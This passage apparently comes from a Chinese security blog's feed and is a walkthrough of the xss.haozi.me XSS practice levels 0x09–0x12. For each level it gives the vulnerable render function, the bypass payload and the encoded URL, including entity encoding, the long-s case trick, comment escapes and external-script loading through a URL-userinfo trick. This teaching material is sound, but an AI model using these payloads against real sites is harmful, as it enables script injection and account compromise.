/^https?:\/\/www\.segmentfault\.com/<br>  <span class="hljs-keyword">if</span> (domainRe.<span class="hljs-title function_ invoke__">test</span>(input)) &#123;<br>    <span class="hljs-keyword">return</span> `&lt;script src=<span class="hljs-string">&quot;$&#123;input&#125;&quot;</span>&gt;&lt;/script&gt;`<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Invalid URL&#x27;</span><br>&#125;<br></code></pre></td></tr></table></figure><ul><li>插入代码</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">https://www.segmentfault.com&quot;&gt;<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">#</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;alert(1) </span></span><br></code></pre></td></tr></table></figure><ul><li>网页代码</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://www.segmentfault.com&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">#</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;alert(1) &quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li>URL</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://xss.test/?input=https%3A%2F%2Fwww.segmentfault.com%22%3E%3C%2Fscript%3E%20%3Cimg%20src%3D%23%20onerror%3D%22alert(1)%20<br></code></pre></td></tr></table></figure><h2 id="0x0A"><a href="#0x0A" class="headerlink" title="0x0A"></a>0x0A</h2><ul><li>server 源码</li></ul><p>将 &amp; ‘ “ &lt; &gt; &#x2F; 符号转为实体编码，在URL中会解析@后面的网址，如果没弹出来试试换个浏览器，低版本火狐可以弹出</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>&#123;<br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escapeHtml</span>(<span class="hljs-params">s</span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> s.<span class="hljs-title function_ invoke__">replace</span>(/&amp;/g, <span class="hljs-string">&#x27;&amp;amp;&#x27;</span>)<br>            .<span class="hljs-title function_ invoke__">replace</span>(/<span class="hljs-string">&#x27;/g, &#x27;</span>&amp;#<span class="hljs-number">39</span>;<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">            .replace(/&quot;/g, &#x27;</span>&amp;quot;<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">            .replace(/&lt;/g, &#x27;</span>&amp;lt;<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">            .replace(/&gt;/g, &#x27;</span>&amp;gt;<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">            .replace(/\//g, &#x27;</span>&amp;#x2f<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">  &#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">  const domainRe = /^https?:\/\/www\.segmentfault\.com/</span><br><span class="hljs-string">  if (domainRe.test(input)) &#123;</span><br><span class="hljs-string">    return `&lt;script src=&quot;$&#123;escapeHtml(input)&#125;&quot;&gt;&lt;/script&gt;`</span><br><span class="hljs-string">  &#125;</span><br><span class="hljs-string">  return &#x27;</span>Invalid URL<span class="hljs-string">&#x27;</span><br><span class="hljs-string">&#125;</span><br></code></pre></td></tr></table></figure><ul><li>插入代码</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">[<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>](https://www.segmentfault.com@xss.haozi.me/j.js)<br></code></pre></td></tr></table></figure><ul><li>网页代码</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https:&amp;#x2f&amp;#x2fwww.segmentfault.com@xss.haozi.me&amp;#x2fj.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li>URL</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://xss.test/?input=https%3A%2F%2Fwww.segmentfault.com%40xss.haozi.me%2Fj.js<br></code></pre></td></tr></table></figure><h2 id="0x0B"><a href="#0x0B" class="headerlink" title="0x0B"></a>0x0B</h2><ul><li>server 源码</li></ul><p>输入内容大写，HTML对大小写不敏感，但是JavaScript对大小写敏感，则ALERT()无法执行，需要想办法绕过对JavaScript的的大写转换：</p><ol><li>html编码绕过</li><li>外部js文件绕过</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>&#123;<br>  input = input.<span class="hljs-title function_ invoke__">toUpperCase</span>()<br>  <span class="hljs-keyword">return</span> `&lt;h1&gt;$&#123;input&#125;&lt;/h1&gt;`<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>插入代码</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">x</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;(1)</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li>网页代码</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">IMG</span> <span class="hljs-attr">SRC</span>=<span class="hljs-string">X</span> <span class="hljs-attr">ONERROR</span>=<span class="hljs-string">&amp;#X61;&amp;#X6C;&amp;#X65;&amp;#X72;&amp;#X74;(1)</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li>URL</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://xss.test/?input=%3Cimg%20src%3Dx%20onerror%3D%26%23x61%3B%26%23x6c%3B%26%23x65%3B%26%23x72%3B%26%23x74%3B(1)%3E%0A<br></code></pre></td></tr></table></figure><h2 id="0x0C"><a href="#0x0C" class="headerlink" title="0x0C"></a>0x0C</h2><ul><li>server 源码</li></ul><p>上题基础增加 script 过滤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>&#123;<br>  input = input.<span class="hljs-title function_ invoke__">replace</span>(/script/ig, <span class="hljs-string">&#x27;&#x27;</span>)<br>  input = input.<span class="hljs-title function_ invoke__">toUpperCase</span>()<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;h1&gt;&#x27;</span> + input + <span class="hljs-string">&#x27;&lt;/h1&gt;&#x27;</span><br>&#125;<br></code></pre></td></tr></table></figure><ul><li>插入代码</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">x</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;(1)</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li>网页代码</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">IMG</span> <span class="hljs-attr">SRC</span>=<span class="hljs-string">X</span> <span class="hljs-attr">ONERROR</span>=<span class="hljs-string">&amp;#X61;&amp;#X6C;&amp;#X65;&amp;#X72;&amp;#X74;(1)</span>&gt;</span> <br><span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li>URL</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://xss.test/?input=%3Cimg%20src%3Dx%20onerror%3D%26%23x61%3B%26%23x6c%3B%26%23x65%3B%26%23x72%3B%26%23x74%3B(1)%3E%20%0A<br></code></pre></td></tr></table></figure><h2 id="0x0D"><a href="#0x0D" class="headerlink" title="0x0D"></a>0x0D</h2><ul><li>server 源码</li></ul><p>输入内容带入到了注释中，可以用换行逃逸。由于过滤了单引号’，所以后面的’)可以用–&gt;注释掉。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>&#123;<br>  input = input.<span class="hljs-title function_ invoke__">replace</span>(/[&lt;/<span class="hljs-string">&quot;&#x27;]/g, &#x27;&#x27;)</span><br><span class="hljs-string">  return `</span><br><span class="hljs-string">    &lt;script&gt;</span><br><span class="hljs-string">          // alert(&#x27;$&#123;input&#125;&#x27;)</span><br><span class="hljs-string">    &lt;/script&gt;</span><br><span class="hljs-string">  `</span><br><span class="hljs-string">&#125;</span><br></code></pre></td></tr></table></figure><ul><li>插入代码</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html">&#x27;) <br>alert(1)<br>--&gt;<br></code></pre></td></tr></table></figure><ul><li>网页代码</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><br>          // alert(&#x27;) <br>alert(1)<br>--&gt;&#x27;)<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li>URL</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://xss.test/?input=&#x27;)%20%0Aalert(1)%0A--%3E<br></code></pre></td></tr></table></figure><h2 id="0x0E"><a href="#0x0E" class="headerlink" title="0x0E"></a>0x0E</h2><ul><li>server 源码</li></ul><p>标签里的第一个字母前加上下划线_，并且大写输入所有字母，ſ是古英语中的s的写法, 转成大写是正常的S</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>&#123;<br>  input = input.<span class="hljs-title function_ invoke__">replace</span>(/&lt;([a-zA-Z])/g, <span class="hljs-string">&#x27;&lt;_$1&#x27;</span>)<br>  input = input.<span class="hljs-title function_ invoke__">toUpperCase</span>()<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;h1&gt;&#x27;</span> + input + <span class="hljs-string">&#x27;&lt;/h1&gt;&#x27;</span><br>&#125;<br></code></pre></td></tr></table></figure><ul><li>插入代码</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;ſcript <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://xss.haozi.me/j.js&quot;</span> &gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li>网页代码</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">SCRIPT</span> <span class="hljs-attr">SRC</span>=<span class="hljs-string">&quot;HTTPS://XSS.HAOZI.ME/J.JS&quot;</span> &gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">SCRIPT</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li>URL</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://xss.test/?input=%3C%C5%BFcript%20src%3D%22https%3A%2F%2Fxss.haozi.me%2Fj.js%22%20%3E%3C%2Fscript%3E<br></code></pre></td></tr></table></figure><h2 id="0x0F"><a href="#0x0F" class="headerlink" title="0x0F"></a>0x0F</h2><ul><li><p>server 源码</p></li><li><p>闭合绕过</p></li><li><p>注释后面内容</p></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>&#123;<br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escapeHtml</span>(<span class="hljs-params">s</span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> s.<span class="hljs-title function_ invoke__">replace</span>(/&amp;/g, <span class="hljs-string">&#x27;&amp;amp;&#x27;</span>)<br>            .<span class="hljs-title function_ invoke__">replace</span>(/<span class="hljs-string">&#x27;/g, &#x27;</span>&amp;#<span class="hljs-number">39</span>;<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">            .replace(/&quot;/g, &#x27;</span>&amp;quot;<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">            .replace(/&lt;/g, &#x27;</span>&amp;lt;<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">            .replace(/&gt;/g, &#x27;</span>&amp;gt;<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">            .replace(/\//g, &#x27;</span>&amp;#x2f;<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">  &#125;</span><br><span class="hljs-string">  return `&lt;img src onerror=&quot;console.error(&#x27;</span>$&#123;<span class="hljs-title function_ invoke__">escapeHtml</span>(input)&#125;<span class="hljs-string">&#x27;)&quot;&gt;`</span><br><span class="hljs-string">&#125;</span><br></code></pre></td></tr></table></figure><ul><li>插入代码</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html">&#x27;);alert(&#x27;1<br>&#x27;);alert(1)//<br></code></pre></td></tr></table></figure><ul><li>网页代码</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;console.error(&#x27;<span class="hljs-symbol">&amp;#39;</span>);alert(<span class="hljs-symbol">&amp;#39;</span>1&#x27;)&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;console.error(&#x27;<span class="hljs-symbol">&amp;#39;</span>);alert(1)<span class="hljs-symbol">&amp;#x2f;</span><span class="hljs-symbol">&amp;#x2f;</span>&#x27;)&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li>URL</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs url">http://xss.test/?input=&#x27;)%3Balert(&#x27;1<br>http://xss.test/?input=&#x27;)%3Balert(1)%2F%2F<br></code></pre></td></tr></table></figure><h2 id="0x10"><a href="#0x10" class="headerlink" title="0x10"></a>0x10</h2><ul><li><p>server 源码</p></li><li><p>闭合标签</p></li><li><p>堆叠注入</p></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>&#123;<br>  <span class="hljs-keyword">return</span> `<br>&lt;script&gt;<br>  window.data = $&#123;input&#125;<br>&lt;/script&gt;<br>  `<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>插入代码</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>``<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<br>1;alert(1);<br><br></code></pre></td></tr></table></figure><ul><li>网页代码</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-variable language_">window</span>.<span class="hljs-property">data</span> = </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>`<br>`<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<br><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-variable language_">window</span>.<span class="hljs-property">data</span> = <span class="hljs-number">1</span>;<span class="hljs-title function_">alert</span>(<span class="hljs-number">1</span>);</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li>URL</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs url">http://xss.test/?input=%3C%2Fscript%3E%60%0A%60%3Cscript%3Ealert(1)<br><br>http://xss.test/?input=1%3Balert(1)%3B<br></code></pre></td></tr></table></figure><h2 id="0x11"><a href="#0x11" class="headerlink" title="0x11"></a>0x11</h2><ul><li>server 源码</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// from alf.nu</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">s</span>) </span>&#123;<br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escapeJs</span> (<span class="hljs-params">s</span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">String</span>(s)<br>            .<span class="hljs-title function_ invoke__">replace</span>(/\\/g, <span class="hljs-string">&#x27;\\\\&#x27;</span>)<br>            .<span class="hljs-title function_ invoke__">replace</span>(/<span class="hljs-string">&#x27;/g, &#x27;</span>\\\<span class="hljs-string">&#x27;&#x27;</span>)<br>            .<span class="hljs-title function_ invoke__">replace</span>(/<span class="hljs-string">&quot;/g, &#x27;\\&quot;</span><span class="hljs-string">&#x27;)</span><br><span class="hljs-string">            .replace(/`/g, &#x27;</span>\\`<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">            .replace(/&lt;/g, &#x27;</span>\\<span class="hljs-number">74</span><span class="hljs-string">&#x27;)</span><br><span class="hljs-string">            .replace(/&gt;/g, &#x27;</span>\\<span class="hljs-number">76</span><span class="hljs-string">&#x27;)</span><br><span class="hljs-string">            .replace(/\//g, &#x27;</span>\\/<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">            .replace(/\n/g, &#x27;</span>\\n<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">            .replace(/\r/g, &#x27;</span>\\r<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">            .replace(/\t/g, &#x27;</span>\\t<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">            .replace(/\f/g, &#x27;</span>\\f<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">            .replace(/\v/g, &#x27;</span>\\v<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">            // .replace(/\b/g, &#x27;</span>\\b<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">            .replace(/\0/g, &#x27;</span>\\<span class="hljs-number">0</span><span class="hljs-string">&#x27;)</span><br><span class="hljs-string">  &#125;</span><br><span class="hljs-string">  s = escapeJs(s)</span><br><span class="hljs-string">  return `</span><br><span class="hljs-string">&lt;script&gt;</span><br><span class="hljs-string">  var url = &#x27;</span><span class="hljs-attr">javascript</span>:console.<span class="hljs-title function_ invoke__">log</span>(<span class="hljs-string">&quot;$&#123;s&#125;&quot;</span>)<span class="hljs-string">&#x27;</span><br><span class="hljs-string">  var a = document.createElement(&#x27;</span>a<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">  a.href = url</span><br><span class="hljs-string">  document.body.appendChild(a)</span><br><span class="hljs-string">  a.click()</span><br><span class="hljs-string">&lt;/script&gt;</span><br><span class="hljs-string">`</span><br><span class="hljs-string">&#125;</span><br></code></pre></td></tr></table></figure><ul><li>插入代码</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html">&quot;);alert(1);(&quot;<br>&quot;);alert(1);//<br></code></pre></td></tr></table></figure><ul><li>网页代码</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-keyword">var</span> url = <span class="hljs-string">&#x27;javascript:console.log(&quot;\&quot;);alert(1);(\&quot;&quot;)&#x27;</span></span><br><span class="language-javascript">  <span class="hljs-keyword">var</span> a = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">&#x27;a&#x27;</span>)</span><br><span class="language-javascript">  a.<span class="hljs-property">href</span> = url</span><br><span class="language-javascript">  <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">appendChild</span>(a)</span><br><span class="language-javascript">  a.<span class="hljs-title function_">click</span>()</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-keyword">var</span> url = <span class="hljs-string">&#x27;javascript:console.log(&quot;\&quot;);alert(1);\/\/&quot;)&#x27;</span></span><br><span class="language-javascript">  <span class="hljs-keyword">var</span> a = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">&#x27;a&#x27;</span>)</span><br><span class="language-javascript">  a.<span class="hljs-property">href</span> = url</span><br><span class="language-javascript">  <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">appendChild</span>(a)</span><br><span class="language-javascript">  a.<span class="hljs-title function_">click</span>()</span><br></code></pre></td></tr></table></figure><ul><li>URL</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs url">http://xss.test/?input=%22)%3Balert(1)%3B(%22<br><br>http://xss.test/?input=%22)%3Balert(1)%3B%2F%2F<br></code></pre></td></tr></table></figure><h2 id="0x12"><a href="#0x12" class="headerlink" title="0x12"></a>0x12</h2><ul><li>server 源码</li></ul><p>“被替换成了\，用\进行转义</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// from alf.nu</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escape</span> (<span class="hljs-params">s</span>) </span>&#123;<br>  s = s.<span class="hljs-title function_ invoke__">replace</span>(/<span class="hljs-string">&quot;/g, &#x27;\\&quot;</span><span class="hljs-string">&#x27;)</span><br><span class="hljs-string">  return &#x27;</span>&lt;script&gt;console.<span class="hljs-title function_ invoke__">log</span>(<span class="hljs-string">&quot;&#x27; + s + &#x27;&quot;</span>);&lt;/script&gt;<span class="hljs-string">&#x27;</span><br><span class="hljs-string">&#125;</span><br></code></pre></td></tr></table></figure><ul><li>插入代码</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">\&quot;);alert(1)//<br></code></pre></td></tr></table></figure><ul><li>网页代码</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;\\&quot;</span>);<span class="hljs-title function_">alert</span>(<span class="hljs-number">1</span>)<span class="hljs-comment">//&quot;);</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li>URL</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://xss.test/?input=%5C%22)%3Balert(1)%2F%2F<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Security</category>
      
      <category>audit</category>
      
      <category>XSS</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Security</tag>
      
      <tag>audit</tag>
      
      <tag>XSS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>经典漏洞-SQL注入</title>
    <link href="/2022/08/04/2022-08-04.%E7%BB%8F%E5%85%B8%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5/"/>
    <url>/2022/08/04/2022-08-04.%E7%BB%8F%E5%85%B8%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5/</url>
    
